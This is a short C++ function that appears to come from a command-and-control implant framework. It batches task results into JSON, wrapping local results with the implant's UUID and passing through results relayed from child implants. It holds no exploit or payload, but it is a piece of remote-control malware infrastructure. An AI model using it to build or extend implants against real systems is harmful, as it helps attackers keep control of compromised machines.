#include <iostream>
#include <vector>
#include <string>
#include "protocols/json/json.h"
#include <queue>

nlohmann::json create_batched_task_json(const std::string& current_implant_uuid, std::queue<nlohmann::json>& queue) {
    nlohmann::json batch = nlohmann::json::array();

    while (!queue.empty()) {
        nlohmann::json item = queue.front();
        queue.pop();

        // VERY IMPORTANT If it ALREADY has an implant_uuid (i.e. it came from a child), 
        // leave it alone and just add it to the batch array.
        // OTHERWISE, tasks from children get wrapped with the parent's UUID, and they are 
        // stored as a response to the parent, of a command that never existed.
        if (item.contains("implant_uuid")) {
            batch.push_back(item);
        }
        // 2. If it DOES NOT have an implant_uuid (i.e. a local task on this implant),
        // wrap it with this implant's UUID.
        else {
            nlohmann::json wrapped_item;
            wrapped_item["implant_uuid"] = current_implant_uuid;
            wrapped_item["task_uuid"] = item["task_uuid"]; // Assuming task_uuid is at the top level
            wrapped_item["result"] = item; // Put the raw data inside 'result'

            batch.push_back(wrapped_item);
        }
    }
    return batch;
}



